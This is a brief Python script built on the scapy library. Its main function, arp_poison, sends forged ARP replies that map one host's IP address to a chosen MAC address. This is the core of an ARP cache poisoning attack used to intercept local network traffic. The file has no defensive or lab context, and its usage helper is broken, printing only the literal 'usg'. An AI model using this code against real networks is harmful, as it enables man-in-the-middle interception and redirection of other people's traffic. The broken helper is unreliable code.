from scapy.all import *


def arp_usage():
    usg = ''
    print('usg')


# spoof arp so that other networks recognize spoofed client
def arp_poison(client, src, dst):
    send(ARP(op=2, hwsrc=src.mac, psrc=src.ip, hwdst=dst.mac, pdst=dst.ip),
         iface=client.intface)
